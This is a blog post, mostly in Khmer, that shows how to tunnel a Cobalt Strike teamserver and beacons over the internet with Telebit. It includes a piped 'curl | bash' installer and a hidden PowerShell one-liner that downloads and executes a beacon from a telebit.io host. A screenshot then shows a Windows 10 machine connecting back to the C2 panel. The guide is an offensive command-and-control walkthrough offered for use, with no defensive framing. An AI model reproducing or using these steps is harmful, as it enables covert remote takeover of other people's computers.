---
title: "CobaltStrike Over WAN Connection"
date: 2022-12-06T22:01:06+07:00
description: តភ្ជាប់និងប្រើប្រាស់ពាក្យបញ្ជាក្នុង CobaltStrike ពីចំងាយ
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- tunnel
- over-wan
categories:
- C2
series:
- CobaltStrike
image: images/feature3/cobaltstrike.jpg
---

ខាងក្រោមនេះជាគំនិតផ្ទាល់ខ្លួនក្នុងការតភ្ជាប់ Teamserver និងប្រើប្រាស់ពាក្យបញ្ជាតាមរយៈ Beacons ពីចំងាយដោយមិនចាំបាច់បើក Port Forwarding ។

#### Requirements

* CobaltStrike
* Telebit

#### Telebit Setup

<b>ចំណាំ៖</b> ចូលទៅកាន់ [telebit.cloud](https://telebit.cloud) ដើម្បីយល់ដឹងបន្ថែមអំពី Configuration ។

នៅក្នុងលីនុចសូមបើកផ្ទាំង Terminal រួចវាយពាក្យបញ្ជាដូខខាងក្រោម៖

{{< highlight zsh "linenos=table" >}}
// Install Telebit
curl https://get.telebit.io/ | bash
{{< / highlight >}}

![Install Telebit](/en/posts/img/2022/12/cbs-over-wan/install-telebit.jpg)

ក្រោយពីបំពេញអាសយដ្ឋាន Email រួចសូមចូលទៅកាន់ផ្ទាំង Inbox រួចបើកដំណើរដំណភ្ជាប់ដែលគេបានផ្ញើមក និងចម្លងចូលនូវលេខទាំង ៤ ខ្ទង់នោះដើម្បីផ្ទៀងផ្ទាត់ ។

![Verify Code](/en/posts/img/2022/12/cbs-over-wan/verify-code.jpg)

![Verified](/en/posts/img/2022/12/cbs-over-wan/verified.jpg)

ប្រសិនបើមិនមានអ្វីខុសឆ្គងទេ យើងនឹងទទួលបានសារបញ្ជាក់ពីភាពជោគជ័យដូចខាងក្រោម៖

![Usage](/en/posts/img/2022/12/cbs-over-wan/telebit-usage.jpg)

#### Usage


តស់! ឥលូវចាប់ផ្ដើមធ្វើការកំណត់នៅលេខ Port សម្រាប់តភ្ជាប់ទៅកាន់ Teamserver និង Beacons

{{< highlight zsh "linenos=table" >}}
// Setup Teamserver Port
~/telebit tcp 50050

// Setup HTTP Beacon
~/telebit http 80 //don't change the port
{{< / highlight >}}

![Teamserver/Beacon Setup](/en/posts/img/2022/12/cbs-over-wan/teamserver-beacon-setup.jpg)

#### Teamserver Connection

បន្ទាប់មកសូមវាយពាក្យបញ្ជាដូចខាងក្រោមដើម្បីបើកដំណើរការ Teamserver

{{< highlight zsh "linenos=table" >}}
sudo ./teamserver x.x.x.x your_password
{{< / highlight >}}

![Start Teamserver](/en/posts/img/2022/12/cbs-over-wan/start-teamserver.jpg)

ដូច្នេះយើងសាកល្បងតភ្ជាប់ Teamserver ដោយប្រើប្រាស់លេខអាយភីរបស់ telebit.cloud ដូចខាងក្រោម៖

![Connect To Teamserver](/en/posts/img/2022/12/cbs-over-wan/connect-teamserver.jpg)

សូមឲ្យប្រាកដថាលេខអាយភី (អាច ping ចេញពី telebit.cloud) លេខច្រក (Port) និង លេខសំងាត់គឺត្រឹមត្រូវមុននិងចុចតភ្ជាប់។

![CobaltStrike Connected](/en/posts/img/2022/12/cbs-over-wan/cbs-connected.jpg)

ជោគជ័យ! ឥលូវនេះយើងបានតភ្ជាប់ Teamserver បានសម្រេច។

#### Adding HTTP/HTTPS Listener

ខាងក្រោមនេះជាវិធីក្នុងការបើកដំណើរការ Listener ពីចំងាយដោយប្រើប្រាស់ Protocol ប្រភេទ HTTP។

![HTTP Listener](/en/posts/img/2022/12/cbs-over-wan/http-listener-80.jpg)

ដោយសារតែ Telebit ត្រូវបាន Redirect ទៅកាន់ Protocol ប្រភេទ HTTPS ដូចនេះយើងក៏ត្រូវតែបើក Listener ជាប្រភេទ HTTPS មួយទៀត។

សូមធ្វើការបើក HTTPS Listener ដូចបានបង្ហាញខាងក្រោម៖

![HTTPS Listener](/en/posts/img/2022/12/cbs-over-wan/https-listener-443.jpg)

#### Generate Beacon

ការកំណត់ខាងលើរួចរាល់អស់ហើយ ដូចនេះយើងអាចសាកល្បងបង្កើត Beacon ដើម្បីតភ្ជាប់។
នៅក្នុងការបង្ហាញនេះយើងនិងប្រើប្រាស់ការវាយប្រហារបែប Scripted Web Delivery ។

![HTTP Beacon](/en/posts/img/2022/12/cbs-over-wan/scripted-web-delivery.jpg)

<b>ចំណាំ៖</b> នៅពេលដែលបានបង្កើតរួចសូមធ្វើការកែប្រែនៅផ្នែកមួយចំនួនដូចជាប្រភេទ Protocol និង Port ដូចខាងក្រោម៖

{{< highlight plain "linenos=table" >}}
// By default it will download from port 80 without https
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://shy-impala-40.telebit.io:80/foo'))"

// Then we have to remove the port and add https instead
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://shy-impala-40.telebit.io/foo'))"
{{< / highlight >}}

#### Execute

យើងបានសាកល្បងបើកដំណើរការនៅក្នុងវីនដូ ១០ ប្រភេទ Pro x64 Bit ដូចរូបខាងក្រោម៖

![Exec Powershell](/en/posts/img/2022/12/cbs-over-wan/exec-powershell.gif)

ប្ដូទៅមើលផ្ទាំងគ្រប់គ្រង CobaltStrike យើងនឹងទទួលបានការតភ្ជាប់ Beacon ពីវីនដូ ១០ នោះ៕

![C2 Connected](/en/posts/img/2022/12/cbs-over-wan/c2-connected.jpg)